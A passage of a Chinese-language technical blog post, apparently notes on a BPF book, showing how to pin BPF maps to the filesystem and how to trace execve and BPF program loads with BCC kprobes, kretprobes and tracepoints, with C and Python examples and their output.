<span class="keyword">int</span> key, value, fd, added, pinned;</span><br><span class="line"></span><br><span class="line">  fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to create map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">  added = bpf_map_update_elem(fd, &amp;key, &amp;value, BPF_ANY);</span><br><span class="line">  <span class="keyword">if</span> (added &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to update map: %d (%s)\n"</span>, added, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pinned = bpf_obj_pin(fd, file_path);</span><br><span class="line">  <span class="keyword">if</span> (pinned &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pin map to the file system: %d (%s)\n"</span>, pinned,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们创建一个固定大小元素的哈希表映射。 然后我们更新映射以仅添加该元素。 如果我们尝试添加更多元素，<code>bpf_map_update_elem</code>将会失败，因为映射会溢出。</p><p>我们使用辅助函数<code>bpf_obj_pin</code>将映射保存在文件系统中。 </p><p><code>Makefile</code>程序如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CLANG = clang</span><br><span class="line"></span><br><span class="line">INCLUDE_PATH += -I/root/linux-5.4/tools/lib/bpf</span><br><span class="line"></span><br><span class="line">LIBRARY_PATH = -L/usr/local/lib64</span><br><span class="line">BPFSO = -lbpf</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: clean </span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f fetch save</span><br><span class="line"></span><br><span class="line"><span class="section">fetch: map_pinning_fetch.c </span></span><br><span class="line">clang -o fetch -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">save: map_pinning_save.c</span></span><br><span class="line">clang -o save -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">build: fetch save</span></span><br><span class="line"></span><br><span class="line">.DEFAULT_GOAL := build</span><br></pre></td></tr></table></figure><p>执行程序前查看<code>/sys/fs/bpf</code>路径下的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br></pre></td></tr></table></figure><p>开始执行该程序</p><p>第一步执行<code>make save</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make save</span><br><span class="line">clang -o save -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_save.c</span><br></pre></td></tr></table></figure><p>第二步执行生成的可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ./save</span><br></pre></td></tr></table></figure><p>在程序执行结束后，再次检查该路径下是否有一个新文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 25 16:15 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br><span class="line">-rw------- 1 root root 0 May 25 16:15 my_array</span><br></pre></td></tr></table></figure><p>接着我们可以编写一个类似的程序，从文件系统加载该映射并打印我们插入的元素。 这样我们就可以验证是否正确保存了映射：</p><p><code>map_pinning_fetch.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd, key, value, result;</span><br><span class="line"></span><br><span class="line">  fd = bpf_obj_get(file_path);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to fetch the map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>;</span><br><span class="line">  result = bpf_map_lookup_elem(fd, &amp;key, &amp;value);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并执行，结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make fetch</span><br><span class="line">clang -o fetch -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_fetch.c</span><br><span class="line">[root@VM-16-14-centos cpt2]# ./fetch </span><br><span class="line">Value read from the map: '1234'</span><br></pre></td></tr></table></figure><p>将BPF对象保存在文件系统中使得数据和程序不再依赖于单个执行线程。信息可以由不同的应用程序共享，BPF程序甚至可以在创建它们的应用程序终止后运行。这为它们提供了额外的级别或可用性，如果没有BPF文件系统，完成这些操作是不可能的。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>在内核和用户空间之间建立通信通道是充分利用BPF程序的基础。 在本章中，我们学习了如何创建BPF映射来建立这种通信以及如何使用它们。我们还描述了可以在程序中使用的映射类型。 接着我们学习到了更具体的映射示例。最后我们学习了如何将整个映射固定到系统中，以使得它们所保存的信息能够经受住崩溃和中断的影响。</p><p>BPF映射是内核和用户空间之间通信的中心总线。在本章中，我们建立了理解它们所需的基本概念。在下一章中，我们将更广泛地使用这些数据结构来共享数据。我们还会介绍一些其他工具，这些工具将使BPF映射的使用更加高效。</p><p>在下一章中将看到BPF程序和映射如何协同工作，从内核的角度为你提供系统上的跟踪功能。 我们探索了将程序附加到内核中不同入口点的不同方法。最后，我们将介绍如何以一种使应用程序更易于调试和观察的方式表示多个数据点。</p><h2 id="第四章节"><a href="#第四章节" class="headerlink" title="第四章节"></a>第四章节</h2><h3 id="使用-BPF-进行跟踪"><a href="#使用-BPF-进行跟踪" class="headerlink" title="使用 BPF 进行跟踪"></a>使用 BPF 进行跟踪</h3><p>在软件工程领域，跟踪是一种通过收集数据进行分析和调试的方法。目标是在运行时提供有用的信息以供将来分析。使用BPF进行跟踪的主要优点是可以访问来自Linux内核和应用程序的任何信息。与其他跟踪技术相比，BPF减少了系统性能和延迟，并且不需要开发人员为了从应用程序收集数据而修改他们的应用程序。</p><p>Linux内核提供了多种可与BPF结合使用的检测功能。在本章我们将讨论这些不同的功能。我们将展示内核如何在操作系统中暴露这些功能，以便你知道如何找到可用于BPF程序的信息。</p><p>跟踪的最终目标是通过获取所有可用数据并以有用的方式呈现，从而让你更加深入的了解系统。 我们将讨论几种不同的数据表示以及如何在不同的场景中使用它们。</p><p>从本章开始，我们将使用一种强大的工具包来编写BPF程序，BPF编译收集器(BCC)。BCC 是一组使构建BPF程序更可预测的组件。即使你掌握了<code>Clang</code>和<code>LLVM</code>，你也不想花费不必要的时间来构建相同的实用程序，除此之外还要确保BPF验证器不会拒绝你编写的程序。BCC为常见结构（如<code>Perf</code>事件映射）提供可重用组件，并与<code>LLVM</code>后端集成以提供更好的调试选项。最重要的是，BCC包括多种编程语言的绑定， 我们将在示例中使用<code>Python</code>。 这些绑定允许你用高级语言编写BPF程序的用户空间部分，从而产生更有用的程序。我们还在后面的章节中使用BCC来使示例代码更加简洁。</p><p>BCC工具安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install bcc-tools</span><br></pre></td></tr></table></figure><p>BCC工具安装在<code>/usr/share/bcc/tools/</code>目录中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ll /usr/share/bcc/tools/</span><br><span class="line">total 1012</span><br><span class="line">-rwxr-xr-x 1 root root 34678 Jul 16  2021 argdist</span><br><span class="line">-rwxr-xr-x 1 root root  2413 Jul 16  2021 bashreadline</span><br><span class="line">-rwxr-xr-x 1 root root 16209 Jul 16  2021 bindsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6774 Jul 16  2021 biolatency</span><br><span class="line">-rwxr-xr-x 1 root root  9979 Jul 16  2021 biolatpcts</span><br><span class="line">-rwxr-xr-x 1 root root  5776 Jul 16  2021 biosnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6687 Jul 16  2021 biotop</span><br><span class="line">-rwxr-xr-x 1 root root  1170 Jul 16  2021 bitesize</span><br><span class="line">-rwxr-xr-x 1 root root  2612 Jul 16  2021 bpflist</span><br><span class="line">-rwxr-xr-x 1 root root  4728 Jul 16  2021 cachestat</span><br><span class="line">-rwxr-xr-x 1 root root  7312 Jul 16  2021 cachetop</span><br><span class="line">-rwxr-xr-x 1 root root  8436 Jul 16  2021 capable</span><br><span class="line">-rwxr-xr-x 1 root root    57 Jul 16  2021 cobjnew</span><br><span class="line">-rwxr-xr-x 1 root root 11181 Jul 16  2021 compactsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  5272 Jul 16  2021 cpudist</span><br><span class="line">-rwxr-xr-x 1 root root 14608 Jul 16  2021 cpuunclaimed</span><br><span class="line">-rwxr-xr-x 1 root root  7402 Jul 16  2021 dbslower</span><br><span class="line">-rwxr-xr-x 1 root root  3794 Jul 16  2021 dbstat</span><br><span class="line">-rwxr-xr-x 1 root root  3963 Jul 16  2021 dcsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  3931 Jul 16  2021 dcstat</span><br><span class="line">-rwxr-xr-x 1 root root 19972 Jul 16  2021 deadlock</span><br></pre></td></tr></table></figure><p>能够在Linux内核中跟踪程序的第一步是确定它为你提供的附加BPF程序的扩展点。这些扩展点通常称为探针(probes)。</p><h4 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h4><p>英语词典中对探针一词的定义之一如下：</p><p>一种无人探索航天器，旨在传输有关其环境的信息。</p><p>这个定义在我们脑海中唤起了对科幻电影和史诗般的NASA任务的回忆。 当我们谈论跟踪探针时，我们可以使用非常相似的定义。</p><p>跟踪探针是探索性程序，旨在传输有关执行它们的环境的信息。</p><p>他们在你的系统中收集数据，供你探索和分析。传统上，在Linux中使用探针涉及编写编译到内核模块中的程序，这可能会导致生产系统中的灾难性问题。多年来，它们发展到执行起来很安全，但编写和测试仍然很麻烦。像<code>SystemTap</code>这样的工具建立了新的协议来编写探针。</p><p>BPF搭载跟踪探测来收集信息以进行调试和分析。BPF程序的安全性使得它们比依赖重新编译内核的工具更有吸引力。重新编译内核以包含外部模块可能会引起由于代码行为不当而导致崩溃的风险。BPF验证器通过在加载到内核之前分析程序来消除这种风险。BPF开发人员利用探针定义并修改内核，从而当代码执行找到其中一个定义时执行的是BPF程序而不是内核模块。</p><p>了解可以定义的不同类型的探针对于探索系统中发生的事情至关重要。在本节中，我们对不同的探针定义进行分类，如何在系统中发现它们，以及如何将BPF程序附着到它们。</p><p>在本章中，我们介绍了四种不同类型的探针：</p><ul><li><p>Kernel probes</p><p>这些使您可以动态访问内核中的内部组件</p></li><li><p>Tracepoints</p><p>这些提供对内核内部组件的静态访问</p></li><li><p>User-space probes</p><p>这些使您可以动态访问在用户空间中运行的程序</p></li><li><p>User statically defined tracepoints</p><p>这些允许静态访问在用户空间中运行的程序</p></li></ul><p>接下来让我们从内核探针开始详细的学习</p><h3 id="Kernel-probes"><a href="#Kernel-probes" class="headerlink" title="Kernel probes"></a>Kernel probes</h3><p>内核探针允许你在几乎任何内核指令中以最小的开销设置动态标志或中断。当内核到达这些标志之一时，它会执行附加到探针的代码，然后恢复其正常例程。内核探针可以为你提供有关系统中发生的任何事情的信息，例如系统中打开的文件和正在执行的二进制文件。关于内核探针需要记住的重要一点是它们没有稳定的应用程序二进制接口 (ABI)，这意味着它们可能会在内核版本之间发生变化。如果你尝试将相同的探测器附加到具有两个不同内核版本的两个系统，则相同的代码可能会停止工作。</p><p>内核探针分为两类：<code>kprobes</code>和<code>kretprobes</code>。 它们的使用取决于你在执行周期中插入BPF程序的位置。 本节将指导你如何使用它们中的每一个将BPF程序附加到这些探针并从内核中提取信息。</p><h4 id="Kprobes"><a href="#Kprobes" class="headerlink" title="Kprobes"></a>Kprobes</h4><p><code>Kprobes</code>允许你在执行任何内核指令之前插入BPF程序。你需要知道你想要破解的函数签名，正如我们之前提到的，这不是一个稳定的ABI，所以如果你要运行相同的程序，你需要在不同的内核版本中小心设置这些探针。 当内核执行到达你设置探针的指令时，它会避开你的代码，运行你的BPF程序，并将执行返回到原始指令。</p><p>为了展示如何使用<code>kprobes</code>，我们将编写一个BPF程序，该程序打印系统中执行的任何二进制文件的名称。在本例中，我们将为BCC工具使用Python前端，但你可以使用任何其他BPF工具编写它：</p><p><code>kprobes.py</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""1</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("executing program: %s\\n", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.attach_kprobe(event=execve_function, fn_name=<span class="string">"do_sys_execve"</span>)</span><br><span class="line">bpf.trace_print()<span class="number">4</span></span><br></pre></td></tr></table></figure><p>1：BPF程序开始执行，辅助函数<code>bpf_get_current_comm</code>将获取内核正在运行的当前命令的名称，并将其存储在我们的<code>comm</code>变量中。我们将其定义为固定长度数组，因为内核对命令名称有16个字符的限制。获得命令名称后，我们将其打印在调试跟踪中，这样运行Python脚本的人就可以看到BPF捕获的所有命令。</p><p>2：加载BPF程序到内核中</p><p>3：将程序与<code>execve</code>系统调用相关联。这个系统调用的名称在不同的内核版本中发生了变化，并且BCC提供了一个函数来检索这个名称，而无需记住你正在运行的内核版本。</p><p>4：该代码输出跟踪日志，因此你可以看到使用该程序跟踪的所有命令。</p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kprobes.py </span><br><span class="line">b'     barad_agent-1950607 [000] d..31 829823.592341: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950610 [000] d..31 829823.594794: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950609 [000] d..31 829823.595494: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950608 [000] d..31 829823.597752: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950614 [000] d..31 829826.591153: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950614 [000] d..31 829826.592741: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950615 [000] d..31 829826.594348: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950617 [000] d..31 829826.595978: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950616 [000] d..31 829826.597514: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950620 [000] d..31 829827.593496: bpf_trace_printk: executing program: barad_agent''</span><br></pre></td></tr></table></figure><h4 id="Kretprobes"><a href="#Kretprobes" class="headerlink" title="Kretprobes"></a>Kretprobes</h4><p>当内核指令在执行后返回一个值时，<code>Kretprobes</code>将插入你的BPF程序。通常，你会希望将<code>kprobes</code>和<code>kretrobes</code>组合到一个BPF程序中，以便全面了解指令的行为。</p><p>我们将使用与上一节中的示例类似的示例来展示<code>kretprobes</code>的工作原理：</p><p><code>kretprobes.py</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int ret_sys_execve(struct pt_regs *ctx) &#123;1</span></span><br><span class="line"><span class="string">  int return_value;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return_value = PT_REGS_RC(ctx);</span></span><br><span class="line"><span class="string">  bpf_trace_printk("program: %s, return: %d\\n", comm, return_value);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=execve_function, fn_name=<span class="string">"ret_sys_execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：定义实现BPF程序的函数。 内核将在<code>execve</code>系统调用完成后立即执行它。 <code>PT_REGS_RC</code>是一个宏，它将从BPF寄存器中读取此特定上下文的返回值。我们还使用<code>bpf_trace_printk</code>在调试日志中打印命令及其返回值</p><p>2：初始化BPF程序并将其加载到内核中</p><p>3：将附着函数更改为<code>attach_kretprobe</code></p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kretprobes.py </span><br><span class="line">b'              sh-1953793 [000] dN.31 831223.599284: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953796 [000] dN.31 831223.601352: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'            grep-1953795 [000] dN.31 831223.602648: bpf_trace_printk: program: grep, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953794 [000] dN.31 831223.604214: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953798 [000] d..31 831226.598533: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953798 [000] d..31 831226.599918: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953799 [000] dN.31 831226.601655: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953801 [000] dN.31 831226.603102: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953800 [000] dN.31 831226.604683: bpf_trace_printk: program: cat, return: 0'</span><br></pre></td></tr></table></figure><p>内核探针是访问内核的一种强大方法。但正如我们之前提到的，它们可能不太稳定，因为你附着到内核源代码中的动态点，这些动态点可能会从一个版本更改或消失到另一个版本。因此我们需要一种更安全的将程序附着到内核的方法。</p><h3 id="Tracepoints"><a href="#Tracepoints" class="headerlink" title="Tracepoints"></a>Tracepoints</h3><p>跟踪点是内核代码中的静态标记，可用于将代码附着到正在运行的内核中。与<code>kprobe</code>的主要区别在于，它们是由内核开发人员在实现内核更改时编写的；这就是为什么我们将它们称为静态的。因为它们是静态的，所以跟踪点的ABI更稳定；内核始终保证旧版本中的跟踪点将存在于新版本中。但是，鉴于开发人员需要将它们添加到内核中，它们可能不会涵盖构成内核的所有子系统。</p><p>正如我们在之前提到的，你可以通过列出<code>/sys/kernel/debug/tracing/events</code>中的所有文件来查看系统中所有可用的跟踪点。</p><p>该输出中列出的每个子目录都对应一个跟踪点，我们可以将BPF程序附着到该跟踪点。但是那里还有两个附加文件。<code>enable</code>文件允许你启用和禁用BPF子系统的所有跟踪点。 如果文件内容为0，则禁用跟踪点；如果文件的内容为1，则启用跟踪点。<code>filter</code>文件允许你编写内核中的Trace子系统将用于过滤事件的表达式。</p><p>编写BPF程序利用跟踪点类似于使用<code>kprobes</code>进行跟踪。 这是一个使用BPF程序来跟踪系统中加载其他BPF程序的所有应用程序的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load(void ctx) &#123;1</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("%s is loading a BPF program", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_tracepoint(tp = <span class="string">"bpf:bpf_prog_load"</span>, fn_name = <span class="string">"trace_bpf_prog_load"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：声明定义BPF程序的函数</p><p>2：该程序的主要区别在于：我们不是将程序附着到<code>kprobe</code>，而是将其附着到跟踪点。 BCC遵循命名跟踪点的约定； 首先，需要指定要跟踪的子系统（在本例中为bpf），后跟一个冒号，然后是子系统中的跟踪点 <code>pbf_prog_load</code>。 这意味着每次内核执行函数<code>bpf_prog_load</code>时，这个程序都会接收到事件，并打印出正在执行 <code>bpf_prog_load</code>指令的应用程序的名称。</p><p>内核探针和跟踪点使你能够完全访问内核。我们建议你尽可能使用跟踪点，但不要仅仅因为跟踪点更安全而坚持使用跟踪点。利用内核探针的动态特性。在下一节中，我们将讨论如何在用户空间运行的程序中获得类似级别的可见性。</p><h3 id="User-Space-Probes"><a href="#User-Space-Probes" class="headerlink" title="User-Space Probes"></a>User-Space Probes</h3><p>用户空间探针允许你在用户空间运行的程序中设置动态标志。它们相当于内核探针，用于检测在内核外运行的程序。当你定义一个<code>uprobe</code>时，内核会在附加的指令周围创建一个陷阱。 当你的应用程序到达该指令时，内核会触发一个事件，该事件将你的探测函数作为回调函数。<code>Uprobes</code>还允许你访问程序链接到的任何库，如果你知道指令的正确名称，就可以跟踪这些调用。</p><p>像内核探针一样，用户空间探针也分为两类，<code>uprobes</code>和<code>uretprobes</code>，这取决于你在程序执行周期中插入BPF程序的位置。 让我们直接看一些例子。</p><h4 id="uprobes"><a href="#uprobes" class="headerlink" 